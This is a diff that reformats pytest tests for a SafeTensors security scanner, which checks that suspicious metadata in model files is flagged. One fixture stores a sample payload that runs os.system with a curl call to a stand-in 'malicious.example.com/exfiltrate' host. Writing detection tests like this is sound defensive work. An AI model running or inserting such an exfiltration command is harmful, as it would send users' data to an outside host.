@@ -46,7 +46,10 @@ def test_corrupted_header(tmp_path: Path) -> None:
     result = scanner.scan(str(corrupt_path))
 
     assert result.has_errors
-    assert any("json" in issue.message.lower() or "header" in issue.message.lower() for issue in result.issues)
+    assert any(
+        "json" in issue.message.lower() or "header" in issue.message.lower()
+        for issue in result.issues
+    )
 
 
 def test_bad_offsets(tmp_path: Path) -> None:
@@ -82,7 +85,9 @@ def test_suspicious_metadata(tmp_path: Path) -> None:
     scanner = SafeTensorsScanner()
     result = scanner.scan(str(file_path))
 
-    assert any("suspicious metadata" in issue.message.lower() for issue in result.issues)
+    assert any(
+        "suspicious metadata" in issue.message.lower() for issue in result.issues
+    )
 
 
 def test_mixed_suspicious_patterns(tmp_path: Path) -> None:
@@ -91,19 +96,25 @@ def test_mixed_suspicious_patterns(tmp_path: Path) -> None:
     data = {"t": np.arange(5, dtype=np.float32)}
 
     # Metadata containing both simple pattern (import) and regex pattern (URL)
-    metadata = {"malicious_code": "import os; os.system('curl https://malicious.example.com/exfiltrate')"}
+    metadata = {
+        "malicious_code": "import os; os.system('curl https://malicious.example.com/exfiltrate')"
+    }
     save_file(data, str(file_path), metadata=metadata)
 
     scanner = SafeTensorsScanner()
     result = scanner.scan(str(file_path))
 
     # Should detect BOTH the import pattern AND the URL pattern
-    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]
+    suspicious_issues = [
+        issue
+        for issue in result.issues
+        if "suspicious metadata" in issue.message.lower()
+    ]
 
     # Should have detected at least 2 issues: one for import, one for URL
-    assert len(suspicious_issues) >= 2, (
-        f"Expected at least 2 suspicious patterns detected, got {len(suspicious_issues)}"
-    )
+    assert (
+        len(suspicious_issues) >= 2
+    ), f"Expected at least 2 suspicious patterns detected, got {len(suspicious_issues)}"
 
     # Verify that different types of issues are detected
     issue_messages = [issue.why for issue in suspicious_issues if issue.why]
@@ -133,12 +144,16 @@ def test_multiple_distinct_patterns(tmp_path: Path) -> None:
     scanner = SafeTensorsScanner()
     result = scanner.scan(str(file_path))
 
-    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]
+    suspicious_issues = [
+        issue
+        for issue in result.issues
+        if "suspicious metadata" in issue.message.lower()
+    ]
 
     # Should detect issues for each metadata field
-    assert len(suspicious_issues) >= 4, (
-        f"Expected at least 4 suspicious patterns detected, got {len(suspicious_issues)}"
-    )
+    assert (
+        len(suspicious_issues) >= 4
+    ), f"Expected at least 4 suspicious patterns detected, got {len(suspicious_issues)}"
 
     # Check that different metadata keys are flagged
     flagged_keys = set()
@@ -149,6 +164,6 @@ def test_multiple_distinct_patterns(tmp_path: Path) -> None:
             flagged_keys.add(key)
 
     expected_keys = {"setup", "code", "callback", "script"}
-    assert flagged_keys.issuperset(expected_keys), (
-        f"Expected all keys {expected_keys} to be flagged, got {flagged_keys}"
-    )
+    assert flagged_keys.issuperset(
+        expected_keys
+    ), f"Expected all keys {expected_keys} to be flagged, got {flagged_keys}"
